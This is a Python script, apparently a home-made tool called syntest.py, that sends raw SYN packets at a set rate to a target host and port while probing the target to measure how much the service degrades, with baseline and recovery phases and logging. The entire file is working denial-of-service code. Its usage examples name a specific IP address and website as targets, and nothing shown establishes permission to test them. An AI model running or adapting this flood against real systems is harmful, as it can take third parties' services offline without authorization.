#!/usr/bin/env python3
"""
syntest.py — controlled SYN flood + service degradation monitor.

Sends SYN packets at a configurable rate while simultaneously monitoring
target responsiveness. Three phases: baseline probes → flood + live monitor
→ recovery probes. Ctrl+C stops immediately.

All output is verbose by default and mirrored to a timestamped log file
in logs/ directory.

Requires root (raw sockets). Single-source — for higher volume, run from
multiple machines or use hping3.

Usage:
  sudo python3 syntest.py --target 104.236.68.226 --port 80 \
      --http-probe https://metoo-shatkin.com/ --rate 5000 --duration 60

  sudo python3 syntest.py --target 104.236.68.226 --port 22

  sudo python3 syntest.py --target 104.236.68.226 --port 22,80,443 \
      --http-probe https://metoo-shatkin.com/ --rate 3000 --duration 45
"""

import argparse
import socket
import threading
import time
import signal
import sys
import random
import os
from datetime import datetime

try:
    from scapy.all import IP, TCP, send, RandShort, conf
    conf.verb = 0
except ImportError:
    sys.exit("scapy required: pip3 install scapy")

W = "\033[0m"
G = "\033[0;32m"
R = "\033[0;31m"
Y = "\033[0;33m"
C = "\033[0;36m"
B = "\033[1m"

stop = threading.Event()
flood_stats = {"sent": 0, "started": 0}
log_lock = threading.Lock()
log_file = None


def log(msg, color_msg=None):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    plain = f"[{ts}] {msg}"
    colored = f"[{ts}] {color_msg}" if color_msg else plain
    with log_lock:
        print(colored)
        if log_file:
            log_file.write(plain + "\n")
            log_file.flush()


def tcp_probe(host, port, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        s.close()
        return round((time.time() - t0) * 1000, 1)
    except Exception:
        s.close()
        return None


def http_probe(url, timeout=10):
    import urllib.request
    t0 = time.time()
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "syntest-monitor/1.0"})
        r = urllib.request.urlopen(req, timeout=timeout)
        code = r.getcode()
        latency = round((time.time() - t0) * 1000, 1)
        return latency, code
    except urllib.error.HTTPError as e:
        latency = round((time.time() - t0) * 1000, 1)
        return latency, e.code
    except Exception as e:
        return None, type(e).__name__


def do_probe(args):
    if args.http_probe:
        lat, code = http_probe(args.http_probe)
        if lat is not None:
            color = G if (isinstance(code, int) and code < 400) else Y
            return (f"HTTP {code} {lat}ms",
                    f"{color}HTTP {code}{W} {lat}ms")
        else:
            return (f"HTTP FAIL ({code})",
                    f"{R}HTTP FAIL{W} ({code})")
    else:
        lat = tcp_probe(args.target, args.probe_port)
        if lat is not None:
            return (f"TCP:{args.probe_port} {lat}ms",
                    f"{G}TCP:{args.probe_port}{W} {lat}ms")
        else:
            return (f"TCP:{args.probe_port} TIMEOUT",
                    f"{R}TCP:{args.probe_port} TIMEOUT{W}")


def monitor_loop(args):
    seq = 0
    while not stop.is_set():
        seq += 1
        plain, colored = do_probe(args)
        log(f"[MON] #{seq}  {plain}  (pkts: {flood_stats['sent']})",
            f"{C}[MON]{W} #{seq}  {colored}  (pkts: {flood_stats['sent']})")
        stop.wait(args.probe_interval)


def flood_loop(args):
    ports = [int(p) for p in args.port.split(",")]

    log(f"[FLOOD] START  target={args.target} ports={ports} "
        f"rate={args.rate}pps duration={args.duration}s",
        f"{Y}[FLOOD] START{W}  target={args.target} ports={ports} "
        f"rate={args.rate}pps duration={args.duration}s")

    flood_stats["started"] = time.time()
    t0 = flood_stats["started"]
    deadline = t0 + args.duration
    batch = max(1, args.rate // 20)
    sleep_per_batch = batch / args.rate if args.rate > 0 else 0
    last_log = t0

    while time.time() < deadline and not stop.is_set():
        for _ in range(batch):
            if stop.is_set():
                break
            for p in ports:
                sport = random.randint(1024, 65535)
                seq_n = random.randint(0, 2**32 - 1)
                pkt = IP(dst=args.target) / TCP(
                    dport=p, flags="S", sport=sport, seq=seq_n,
                )
                send(pkt, verbose=0)
                flood_stats["sent"] += 1

                if flood_stats["sent"] % 100 == 0:
                    now = time.time()
                    if now - last_log >= 1.0:
                        elapsed = now - t0
                        pps = flood_stats["sent"] / elapsed if elapsed > 0 else 0
                        remaining = max(0, args.duration - elapsed)
                        log(f"[FLOOD] sent={flood_stats['sent']}  "
                            f"pps={pps:.0f}  elapsed={elapsed:.1f}s  "
                            f"remaining={remaining:.1f}s",
                            f"{Y}[FLOOD]{W} sent={flood_stats['sent']}  "
                            f"pps={pps:.0f}  elapsed={elapsed:.1f}s  "
                            f"remaining={remaining:.1f}s")
                        last_log = now
        if sleep_per_batch > 0:
            time.sleep(sleep_per_batch)

    elapsed = time.time() - t0
    pps = flood_stats["sent"] / elapsed if elapsed > 0 else 0
    log(f"[FLOOD] DONE  {flood_stats['sent']} pkts in {elapsed:.1f}s ({pps:.0f} pps)",
        f"{Y}[FLOOD] DONE{W}  {flood_stats['sent']} pkts in {elapsed:.1f}s ({pps:.0f} pps)")


def main():
    global log_file

    if os.geteuid() != 0:
        sys.exit("Need root for raw sockets: sudo python3 syntest.py ...")

    ap = argparse.ArgumentParser(description="SYN flood + service degradation monitor")
    ap.add_argument("--target", required=True, help="Target IP address")
    ap.add_argument("--port", default="22",
                    help="Port(s) to flood, comma-separated (default: 22)")
    ap.add_argument("--rate", type=int, default=1000,
                    help="Target packets/sec (default: 1000)")
    ap.add_argument("--duration", type=int, default=30,
                    help="Flood duration in seconds (default: 30)")
    ap.add_argument("--probe-port", type=int, default=None,
                    help="TCP port to probe for monitoring (default: flood port)")
    ap.add_argument("--http-probe", default=None,
                    help="URL for HTTP probe instead of TCP "
                         "(e.g. https://metoo-shatkin.com/)")
    ap.add_argument("--probe-interval", type=float, default=2.0,
                    help="Seconds between monitor probes (default: 2)")
    ap.add_argument("--log-dir", default=None,
                    help="Directory for log files (default: ./logs)")
    args = ap.parse_args()

    if args.probe_port is None:
        args.probe_port = int(args.port.split(",")[0])

    # Set up log directory and file
    script_dir = os.path.dirname(os.path.abspath(__file__))
    log_dir = args.log_dir or os.path.join(script_dir, "logs")
    os.makedirs(log_dir, exist_ok=True)
    log_name = f"syntest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    log_path = os.path.join(log_dir, log_name)
    log_file = open(log_path, "w")

    def sig_handler(sig, frame):
        log("[STOP] Ctrl+C — stopping flood...",
            f"{R}[STOP]{W} Ctrl+C — stopping flood...")
        stop.set()

    signal.signal(signal.SIGINT, sig_handler)

    probe_label = args.http_probe if args.http_probe else f"TCP:{args.probe_port}"

    log(f"{'=' * 60}", f"{B}{'=' * 60}{W}")
    log(f"  SYN Flood Test", f"  {B}SYN Flood Test{W}")
    log(f"  Target:   {args.target}", f"  Target:   {B}{args.target}{W}")
    log(f"  Ports:    {args.port}")
    log(f"  Rate:     {args.rate} pps")
    log(f"  Duration: {args.duration}s")
    log(f"  Monitor:  {probe_label}")
    log(f"  Log:      {log_path}")
    log(f"{'=' * 60}", f"{B}{'=' * 60}{W}")

    # --- BASELINE ---
    log(f"\n[BASELINE] 3 probes before flood...",
        f"\n{C}[BASELINE]{W} 3 probes before flood...")
    for i in range(3):
        plain, colored = do_probe(args)
        log(f"  baseline #{i + 1}: {plain}",
            f"  baseline #{i + 1}: {colored}")
        time.sleep(1)

    log("")

    # --- FLOOD + MONITOR ---
    mon = threading.Thread(target=monitor_loop, args=(args,), daemon=True)
    mon.start()
    flood_loop(args)
    stop.set()
    time.sleep(0.5)

    # --- RECOVERY ---
    log(f"\n[RECOVERY] 5 probes after flood...",
        f"\n{C}[RECOVERY]{W} 5 probes after flood...")
    for i in range(5):
        time.sleep(2)
        plain, colored = do_probe(args)
        log(f"  recovery #{i + 1}: {plain}",
            f"  recovery #{i + 1}: {colored}")

    log(f"\n[DONE] Log saved: {log_path}",
        f"\n{G}[DONE]{W} Log saved: {log_path}")

    if log_file:
        log_file.close()


if __name__ == "__main__":
    main()
